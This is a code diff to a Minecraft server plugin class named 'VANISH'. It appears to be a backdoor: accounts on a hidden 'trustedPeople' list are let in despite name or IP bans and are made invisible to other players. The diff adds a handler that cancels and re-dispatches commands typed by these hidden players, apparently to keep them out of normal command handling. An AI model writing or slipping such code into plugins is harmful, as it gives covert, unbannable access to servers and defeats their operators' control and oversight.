@@ -80,9 +80,9 @@ public class VANISH extends Command {
         if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
         boolean isNameBanned = Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName());
         boolean isIPBanned = Bukkit.getBanList(BanList.Type.IP).isBanned(e.getAddress().toString().substring(1));
+        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = Quartet.with(p.getUniqueId(), isNameBanned, isIPBanned, e.getResult());
         e.allow();
         invisPlayers.add(p.getUniqueId());
-        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = Quartet.with(p.getUniqueId(), isNameBanned, isIPBanned, e.getResult());
         bannedPlayers.add(quartet);
     }
 
@@ -127,6 +127,14 @@ public class VANISH extends Command {
             if (pl == null || !pl.isOnline()) continue;
             e.getPlayer().hidePlayer(Start.Instance, pl);
         }
+    }
+
+    @Override
+    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
+        Player p = e.getPlayer();
+        if (!invisPlayers.contains(p.getUniqueId())) return;
+        e.setCancelled(true);
+        Bukkit.dispatchCommand(p, e.getMessage());
     }
 
     @Override
